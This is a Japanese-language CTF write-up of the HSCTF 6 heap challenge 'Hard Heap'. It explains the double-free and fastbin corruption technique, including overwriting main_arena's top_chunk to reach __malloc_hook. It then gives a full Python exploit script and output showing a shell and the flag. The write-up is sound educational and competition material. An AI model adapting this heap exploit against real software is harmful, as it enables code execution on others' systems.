# [pwn 480pts] Hard Heap - HSCTF 6
64ビットで全部有効です。
```
$ checksec -f hard-heap
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes	0		2	hard-heap
```

典型的なヒープ系問題で、問題文的にTJCTFのHalcyon Heapの続きみたいです。
double freeがあるのですが、サイズは0x48までしか指定できないのでunsorted binに直接入れてlibcのアドレスを盗むことはできません。
したがって、ヒープのアドレスを取ってからoverlapさせ、別のチャンクのサイズを変更することでlibcのアドレスを取りましょう。

これで終わりかと思うと問題があり、fastbinなので`__malloc_hook`などを使う必要があります。
しかし、0x48までしか確保できないのでこれが使えません。

ここで詰まっていたのですが、writeupを読むと2つ方法があるようです。

1. main_arenaのtop_chunkを書き換える
2. unsorted bin attackで`_IO_list_all`等を書き換える

最初は2の方法で試したのですが、なぜかunsorted bin attackが上手くいかなかったので1の方法で解きました。
原理は`__malloc_hook`の時と似ていて、`main_arena`にはfastbinなどで0x55....や0x56...などから始まるヒープのアドレスがあるので、サイズ0x48のチャンクを作ることができます。
これを利用して上手いこと`top_chunk`を書き換えれば、fastbinやunsorted binが使えないチャンクをmallocしたときに`top_chunk`が使われるので任意のアドレスを書き換えることができます。

```python
from ptrlib import *

def sice_deet(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("> ")
    sock.sendline(str(size))
    sock.recvuntil("> ")
    sock.send(data)

def observe_deet(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("> ")
    sock.sendline(str(index))
    return sock.recvline().rstrip()

def antisice_deet(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("> ")
    sock.sendline(str(index))

#sock = Process("./hard-heap")
libc = ELF("./libc.so.6")
#sock = Socket("localhost", 9999)
sock = Socket("pwn.hsctf.com", 5555)
main_arena = 0x3c4b20
delta = 0x58
one_gadget = 0xf1147

# leak heap
fake_chunk = b"A" * 0x30
fake_chunk += p64(0)
fake_chunk += p64(0x51)
sice_deet(0x48, fake_chunk) # sice:0 (0x00)
sice_deet(0x48, "1") # sice:1 (0x50)
sice_deet(0x48, "2") # 0xa0
sice_deet(0x48, "3") # 0xf0
antisice_deet(0)
antisice_deet(1)
antisice_deet(0)
addr_heap = u64(observe_deet(0)) - 0x50 # addr of sice:0
logger.info("heap = " + hex(addr_heap))
assert addr_heap > 0

# overlap & libc base
sice_deet(0x48, p64(addr_heap + 0x40)) # sice:4 = sice:0
sice_deet(0x48, "X" * 8) # sice:5
sice_deet(0x48, "AAAA") # sice:6
payload = p64(0) + p64(0xa1)
sice_deet(0x48, payload) # sice:7
antisice_deet(1)
libc_base = u64(observe_deet(1)) - main_arena - delta
logger.info("libc base = " + hex(libc_base))
addr_one_gadget = libc_base + 0x4526a

# create heap address on main_arena before top_chunk
sice_deet(0x20, "dummy") # sice:8
antisice_deet(8)

# fastbin corruption attack
sice_deet(0x48, "9") # sice:9
sice_deet(0x48, "10") # sice:10
sice_deet(0x48, "11") # sice:11
antisice_deet(10)
antisice_deet(11)
antisice_deet(10)
sice_deet(0x48, p64(libc_base + main_arena + 13)) # sice:12
sice_deet(0x48, "dummy") # sice:13
sice_deet(0x48, "dummy") # sice:14
payload = b'\x00' * 3
payload += p64((libc_base + main_arena + 0x20)) # fastbin for 0x50
payload += p64(0x51)
sice_deet(0x48, payload) # now fastbin(for 0x50) is &top_chunk (sice:15)
target = libc_base + libc.symbol("__malloc_hook") - 27 - 8
payload = p64(0) * 5
payload += p64(target)
sice_deet(0x48, payload) # top_chunk (sice:16)

# overwrite __malloc_hook
sice_deet(0x48, b'\xff' * 0x13 + p64(libc_base + one_gadget))

# get the shell!
sock.recvuntil("> ")
sock.sendline("1")
sock.recvuntil("> ")
sock.sendline("11")

sock.interactive()
```

ヒープのアドレスが0x56...から始まらないと失敗するので、3,4回動かせば当たります。
```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:5555
[+] <module>: heap = 0x56377b3b4000
[+] <module>: libc base = 0x7f7814a07000
[ptrlib]$ cat flag
[ptrlib]$ 
hsctf{you_sice_deets_so_well_you_must_be_suchet}[ptrlib]$
```

# 感想
難しかったですが面白かったです。

# 参考文献
[1] [https://owodelta.github.io/2019/06/09/Hard-Heap-HSCTF-6/](https://owodelta.github.io/2019/06/09/Hard-Heap-HSCTF-6/)

[2] [https://github.com/thebound7/ctf_writeup/tree/master/HSCTF/hard_heap](https://github.com/thebound7/ctf_writeup/tree/master/HSCTF/hard_heap)